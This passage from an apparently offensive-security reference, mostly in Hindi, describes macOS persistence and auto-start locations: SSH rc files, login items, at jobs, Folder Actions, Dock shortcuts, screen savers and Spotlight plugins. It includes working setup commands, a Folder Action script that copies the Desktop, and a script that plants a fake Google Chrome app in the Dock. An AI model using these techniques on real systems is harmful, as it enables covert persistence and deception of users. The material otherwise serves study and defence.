[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) **macOS** के लिए एक स्वचालन प्लेटफ़ॉर्म के रूप में कार्य करता है, जो अपनी संचालन के लिए **LUA स्क्रिप्टिंग भाषा** का उपयोग करता है। विशेष रूप से, यह पूर्ण AppleScript कोड के एकीकरण और शेल स्क्रिप्टों के निष्पादन का समर्थन करता है, जिससे इसकी स्क्रिप्टिंग क्षमताओं में काफी वृद्धि होती है।

ऐप एकल फ़ाइल, `~/.hammerspoon/init.lua` की तलाश करता है, और जब शुरू किया जाता है तो स्क्रिप्ट निष्पादित की जाएगी।
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन BetterTouchTool को स्थापित करना आवश्यक है
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* यह Automation-Shortcuts और Accessibility अनुमतियों की मांग करता है

#### स्थान

* `~/Library/Application Support/BetterTouchTool/*`

यह उपकरण उन अनुप्रयोगों या स्क्रिप्टों को इंगित करने की अनुमति देता है जिन्हें कुछ शॉर्टकट दबाने पर निष्पादित किया जाना है। एक हमलावर अपने **शॉर्टकट और क्रिया को डेटाबेस में कॉन्फ़िगर करने में सक्षम हो सकता है** ताकि यह मनमाना कोड निष्पादित कर सके (एक शॉर्टकट बस एक कुंजी दबाने के लिए हो सकता है)।

### Alfred

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन Alfred को स्थापित करना आवश्यक है
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* यह Automation, Accessibility और यहां तक कि Full-Disk एक्सेस अनुमतियों की मांग करता है

#### स्थान

* `???`

यह कार्यप्रवाह बनाने की अनुमति देता है जो कुछ शर्तें पूरी होने पर कोड निष्पादित कर सकते हैं। संभावित रूप से, एक हमलावर एक कार्यप्रवाह फ़ाइल बना सकता है और Alfred को इसे लोड करने के लिए मजबूर कर सकता है (कार्यप्रवाह का उपयोग करने के लिए प्रीमियम संस्करण का भुगतान करना आवश्यक है)।

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन ssh को सक्षम और उपयोग करना आवश्यक है
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* SSH का उपयोग FDA एक्सेस के लिए किया जाता था

#### स्थान

* **`~/.ssh/rc`**
* **ट्रिगर**: ssh के माध्यम से लॉगिन
* **`/etc/ssh/sshrc`**
* रूट आवश्यक
* **ट्रिगर**: ssh के माध्यम से लॉगिन

{% hint style="danger" %}
ssh को चालू करने के लिए Full Disk Access की आवश्यकता होती है:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### विवरण और शोषण

डिफ़ॉल्ट रूप से, जब तक `/etc/ssh/sshd_config` में `PermitUserRC no` नहीं है, जब एक उपयोगकर्ता **SSH के माध्यम से लॉगिन करता है**, तो स्क्रिप्ट **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** निष्पादित की जाएंगी।

### **लॉगिन आइटम**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको `osascript` को आर्ग्स के साथ निष्पादित करना होगा
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **ट्रिगर:** लॉगिन
* शोषण पेलोड **`osascript`** को कॉल करते समय संग्रहीत किया गया
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **ट्रिगर:** लॉगिन
* रूट की आवश्यकता है

#### विवरण

System Preferences -> Users & Groups -> **लॉगिन आइटम** में आप **उन आइटमों को पा सकते हैं जिन्हें उपयोगकर्ता लॉगिन करते समय निष्पादित किया जाएगा**।\
इन्हें सूचीबद्ध करना, जोड़ना और कमांड लाइन से हटाना संभव है:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**लॉगिन आइटम** भी API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) का उपयोग करके संकेतित किए जा सकते हैं जो **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** में कॉन्फ़िगरेशन को स्टोर करेगा।

### ZIP as Login Item

(लॉगिन आइटम के बारे में पिछले अनुभाग को देखें, यह एक विस्तार है)

यदि आप एक **ZIP** फ़ाइल को **लॉगिन आइटम** के रूप में स्टोर करते हैं, तो **`Archive Utility`** इसे खोलेगा और यदि ज़िप उदाहरण के लिए **`~/Library`** में स्टोर किया गया था और इसमें **`LaunchAgents/file.plist`** फ़ोल्डर था जिसमें एक बैकडोर था, तो वह फ़ोल्डर बनाया जाएगा (यह डिफ़ॉल्ट रूप से नहीं होता) और plist जोड़ा जाएगा ताकि अगली बार जब उपयोगकर्ता फिर से लॉगिन करे, तो **plist में संकेतित बैकडोर निष्पादित होगा**।

एक और विकल्प होगा कि उपयोगकर्ता HOME के अंदर फ़ाइलें **`.bash_profile`** और **`.zshenv`** बनाई जाएं ताकि यदि फ़ोल्डर LaunchAgents पहले से मौजूद है तो यह तकनीक अभी भी काम करेगी।

### At

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको **`at`** को **निष्पादित** करना होगा और इसे **सक्षम** होना चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* आपको **`at`** को **निष्पादित** करना होगा और इसे **सक्षम** होना चाहिए

#### **Description**

`at` कार्यों को **एक बार के कार्यों** को निश्चित समय पर निष्पादित करने के लिए डिज़ाइन किया गया है। क्रॉन जॉब्स के विपरीत, `at` कार्य निष्पादन के बाद स्वचालित रूप से हटा दिए जाते हैं। यह ध्यान रखना महत्वपूर्ण है कि ये कार्य सिस्टम रिबूट के दौरान स्थायी होते हैं, जो उन्हें कुछ परिस्थितियों में संभावित सुरक्षा चिंताओं के रूप में चिह्नित करता है।

**डिफ़ॉल्ट** रूप से ये **निष्क्रिय** होते हैं लेकिन **रूट** उपयोगकर्ता इन्हें **सक्षम** कर सकता है:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
यह 1 घंटे में एक फ़ाइल बनाएगा:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:` का उपयोग करके नौकरी की कतार की जांच करें:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
ऊपर हम दो निर्धारित कार्य देख सकते हैं। हम `at -c JOBNUMBER` का उपयोग करके कार्य का विवरण प्रिंट कर सकते हैं।
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
यदि AT कार्य सक्षम नहीं हैं, तो बनाए गए कार्य निष्पादित नहीं होंगे।
{% endhint %}

The **job files** can be found at `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at `a0001a019bdcd2`.

* `a` - यह कतार है
* `0001a` - जॉब नंबर हेक्स में, `0x1a = 26`
* `019bdcd2` - समय हेक्स में। यह युग से बीते मिनटों का प्रतिनिधित्व करता है। `0x019bdcd2` दशमलव में `26991826` है। यदि हम इसे 60 से गुणा करते हैं, तो हमें `1619509560` मिलता है, जो कि `GMT: 2021. April 27., Tuesday 7:46:00` है।

If we print the job file, we find that it contains the same information we got using `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
* इसमें कुछ बुनियादी TCC अनुमतियाँ हैं जैसे कि डेस्कटॉप, दस्तावेज़ और डाउनलोड

#### Location

* **`/Library/Scripts/Folder Action Scripts`**
* रूट आवश्यक
* **Trigger**: निर्दिष्ट फ़ोल्डर तक पहुँच
* **`~/Library/Scripts/Folder Action Scripts`**
* **Trigger**: निर्दिष्ट फ़ोल्डर तक पहुँच

#### Description & Exploitation

Folder Actions वे स्क्रिप्ट हैं जो फ़ोल्डर में परिवर्तन जैसे आइटम जोड़ना, हटाना, या फ़ोल्डर विंडो खोलने या आकार बदलने जैसी अन्य क्रियाओं द्वारा स्वचालित रूप से सक्रिय होती हैं। इन क्रियाओं का विभिन्न कार्यों के लिए उपयोग किया जा सकता है, और इन्हें Finder UI या टर्मिनल कमांड का उपयोग करके विभिन्न तरीकों से सक्रिय किया जा सकता है।

To set up Folder Actions, you have options like:

1. Crafting a Folder Action workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.
2. Attaching a script manually via the Folder Actions Setup in the context menu of a folder.
3. Utilizing OSAScript to send Apple Event messages to the `System Events.app` for programmatically setting up a Folder Action.
* This method is particularly useful for embedding the action into the system, offering a level of persistence.

The following script is an example of what can be executed by a Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Folder Actions द्वारा उपरोक्त स्क्रिप्ट को उपयोगी बनाने के लिए, इसे संकलित करें:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
स्क्रिप्ट संकलित होने के बाद, नीचे दिए गए स्क्रिप्ट को निष्पादित करके फ़ोल्डर क्रियाएँ सेट करें। यह स्क्रिप्ट वैश्विक रूप से फ़ोल्डर क्रियाओं को सक्षम करेगी और विशेष रूप से पूर्व में संकलित स्क्रिप्ट को डेस्कटॉप फ़ोल्डर से जोड़ देगी।
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
setup स्क्रिप्ट चलाएँ:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* यह GUI के माध्यम से इस स्थिरता को लागू करने का तरीका है:

यह स्क्रिप्ट है जो निष्पादित की जाएगी:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

इसे संकलित करें: `osacompile -l JavaScript -o folder.scpt source.js`

इसे स्थानांतरित करें:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
फिर, `Folder Actions Setup` ऐप खोलें, **उस फ़ोल्डर का चयन करें जिसे आप देखना चाहते हैं** और आपके मामले में **`folder.scpt`** का चयन करें (मेरे मामले में मैंने इसे output2.scp कहा):

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

अब, यदि आप उस फ़ोल्डर को **Finder** के साथ खोलते हैं, तो आपका स्क्रिप्ट निष्पादित होगा।

यह कॉन्फ़िगरेशन **plist** में संग्रहीत था जो **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** में base64 प्रारूप में है।

अब, चलिए बिना GUI एक्सेस के इस स्थिरता को तैयार करने की कोशिश करते हैं:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** को `/tmp` में बैकअप के लिए कॉपी करें:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. आपने जो फ़ोल्डर क्रियाएँ सेट की हैं, उन्हें **हटाएँ**:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

अब जब हमारे पास एक खाली वातावरण है

3. बैकअप फ़ाइल कॉपी करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस कॉन्फ़िगरेशन का उपयोग करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
और यह मेरे लिए काम नहीं किया, लेकिन ये लेखन से निर्देश हैं:(
{% endhint %}

### डॉक शॉर्टकट

लेखन: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको सिस्टम के अंदर एक दुर्भावनापूर्ण एप्लिकेशन स्थापित करना होगा
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* `~/Library/Preferences/com.apple.dock.plist`
* **ट्रिगर**: जब उपयोगकर्ता डॉक के अंदर ऐप पर क्लिक करता है

#### विवरण और शोषण

सभी एप्लिकेशन जो डॉक में दिखाई देते हैं, उन्हें plist में निर्दिष्ट किया गया है: **`~/Library/Preferences/com.apple.dock.plist`**

आप केवल निम्नलिखित के साथ **एक एप्लिकेशन जोड़ना** संभव है:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

कुछ **सोशल इंजीनियरिंग** का उपयोग करके आप **उदाहरण के लिए Google Chrome** की नकल कर सकते हैं डॉक के अंदर और वास्तव में अपना खुद का स्क्रिप्ट चला सकते हैं:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Sandbox को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* एक बहुत विशिष्ट क्रिया होनी चाहिए
* आप एक और सैंडबॉक्स में समाप्त होंगे
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/Library/ColorPickers`
* रूट आवश्यक
* ट्रिगर: रंग पिकर का उपयोग करें
* `~/Library/ColorPickers`
* ट्रिगर: रंग पिकर का उपयोग करें

#### Description & Exploit

**अपने कोड के साथ एक रंग पिकर** बंडल संकलित करें (आप [**इसका उदाहरण ले सकते हैं**](https://github.com/viktorstrate/color-picker-plus)) और एक कंस्ट्रक्टर जोड़ें (जैसे [स्क्रीन सेवर अनुभाग](macos-auto-start-locations.md#screen-saver) में) और बंडल को `~/Library/ColorPickers` में कॉपी करें।

फिर, जब रंग पिकर को ट्रिगर किया जाता है, तो आपका शोर भी होना चाहिए।

ध्यान दें कि आपकी लाइब्रेरी लोड करने वाला बाइनरी एक **बहुत प्रतिबंधात्मक सैंडबॉक्स** है: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: **नहीं, क्योंकि आपको अपना ऐप चलाना होगा**
* TCC बायपास: ???

#### स्थान

* एक विशिष्ट ऐप

#### विवरण & शोषण

एक एप्लिकेशन उदाहरण जिसमें एक Finder Sync Extension [**यहां पाया जा सकता है**](https://github.com/D00MFist/InSync).

एप्लिकेशन में `Finder Sync Extensions` हो सकते हैं। यह एक्सटेंशन एक एप्लिकेशन के अंदर जाएगा जिसे चलाया जाएगा। इसके अलावा, एक्सटेंशन को अपना कोड निष्पादित करने के लिए **कुछ मान्य Apple डेवलपर प्रमाणपत्र के साथ साइन किया जाना चाहिए**, इसे **सैंडबॉक्स किया जाना चाहिए** (हालांकि ढीले अपवाद जोड़े जा सकते हैं) और इसे कुछ इस तरह से पंजीकृत किया जाना चाहिए:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### स्क्रीन सेवर

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आप एक सामान्य एप्लिकेशन सैंडबॉक्स में समाप्त होंगे
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* `/System/Library/Screen Savers`
* रूट आवश्यक
* **ट्रिगर**: स्क्रीन सेवर का चयन करें
* `/Library/Screen Savers`
* रूट आवश्यक
* **ट्रिगर**: स्क्रीन सेवर का चयन करें
* `~/Library/Screen Savers`
* **ट्रिगर**: स्क्रीन सेवर का चयन करें

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण और शोषण

Xcode में एक नया प्रोजेक्ट बनाएं और एक नया **स्क्रीन सेवर** उत्पन्न करने के लिए टेम्पलेट का चयन करें। फिर, इसमें अपना कोड जोड़ें, उदाहरण के लिए लॉग उत्पन्न करने के लिए निम्नलिखित कोड।

**बिल्ड** करें, और `.saver` बंडल को **`~/Library/Screen Savers`** में कॉपी करें। फिर, स्क्रीन सेवर GUI खोलें और यदि आप बस उस पर क्लिक करते हैं, तो यह बहुत सारे लॉग उत्पन्न करना चाहिए:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
ध्यान दें कि क्योंकि इस कोड को लोड करने वाले बाइनरी के अधिकारों के अंदर (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) आप **`com.apple.security.app-sandbox`** पा सकते हैं, आप **सामान्य एप्लिकेशन सैंडबॉक्स के अंदर** होंगे।
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Sandbox को बायपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आप एक एप्लिकेशन सैंडबॉक्स में समाप्त होंगे
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)
* सैंडबॉक्स बहुत सीमित लगता है

#### Location

* `~/Library/Spotlight/`
* **Trigger**: एक नई फ़ाइल बनाई जाती है जिसमें स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक्सटेंशन होता है।
* `/Library/Spotlight/`
* **Trigger**: एक नई फ़ाइल बनाई जाती है जिसमें स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक्सटेंशन होता है।
* रूट आवश्यक
* `/System/Library/Spotlight/`
* **Trigger**: एक नई फ़ाइल बनाई जाती है जिसमें स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक्सटेंशन होता है।
* रूट आवश्यक
* `Some.app/Contents/Library/Spotlight/`
* **Trigger**: एक नई फ़ाइल बनाई जाती है जिसमें स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक्सटेंशन होता है।
* नई ऐप आवश्यक

#### Description & Exploitation

Spotlight macOS की अंतर्निहित खोज सुविधा है, जिसे उपयोगकर्ताओं को **अपने कंप्यूटर पर डेटा तक त्वरित और व्यापक पहुंच प्रदान करने के लिए डिज़ाइन किया गया है**।\
इस त्वरित खोज क्षमता को सुविधाजनक बनाने के लिए, Spotlight एक **स्वामित्व डेटाबेस** बनाए रखता है और **अधिकांश फ़ाइलों को पार्स करके** एक अनुक्रमणिका बनाता है, जिससे फ़ाइल नामों और उनके सामग्री के माध्यम से तेज़ खोजें संभव होती हैं।

Spotlight का अंतर्निहित तंत्र एक केंद्रीय प्रक्रिया 'mds' नामक है, जिसका अर्थ है **'मेटाडेटा सर्वर'।** यह प्रक्रिया पूरी Spotlight सेवा का संचालन करती है। इसके साथ, कई 'mdworker' डेमन होते हैं जो विभिन्न रखरखाव कार्य करते हैं, जैसे विभिन्न फ़ाइल प्रकारों का अनुक्रमण ( `ps -ef | grep mdworker` )। ये कार्य Spotlight आयातक प्लगइनों, या **".mdimporter bundles"** के माध्यम से संभव होते हैं, जो Spotlight को विभिन्न फ़ाइल प्रारूपों में सामग्री को समझने और अनुक्रमित करने में सक्षम बनाते हैं।

प्लगइन्स या **`.mdimporter`** बंडल पहले उल्लेखित स्थानों में स्थित होते हैं और यदि एक नया बंडल प्रकट होता है, तो इसे एक मिनट के भीतर लोड किया जाता है (किसी सेवा को पुनः प्रारंभ करने की आवश्यकता नहीं है)। इन बंडलों को यह संकेत देना आवश्यक है कि वे **कौन से फ़ाइल प्रकार और एक्सटेंशन प्रबंधित कर सकते हैं**, इस तरह, Spotlight उन्हें तब उपयोग करेगा जब एक नई फ़ाइल बनाई जाती है जिसमें निर्दिष्ट एक्सटेंशन होता है।

यह संभव है कि **सभी `mdimporters`** लोड किए गए चल रहे हैं:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** इन प्रकार की फ़ाइलों (एक्सटेंशन `.iba` और `.book` सहित) को पार्स करने के लिए उपयोग किया जाता है:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
यदि आप अन्य `mdimporter` का Plist चेक करते हैं, तो आपको प्रविष्टि **`UTTypeConformsTo`** नहीं मिल सकती। इसका कारण यह है कि यह एक अंतर्निहित _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) है और इसे एक्सटेंशन निर्दिष्ट करने की आवश्यकता नहीं है।

इसके अलावा, सिस्टम डिफ़ॉल्ट प्लगइन्स हमेशा प्राथमिकता लेते हैं, इसलिए एक हमलावर केवल उन फ़ाइलों तक पहुँच सकता है जो अन्यथा एप्पल के अपने `mdimporters` द्वारा अनुक्रमित नहीं हैं।
{% endhint %}

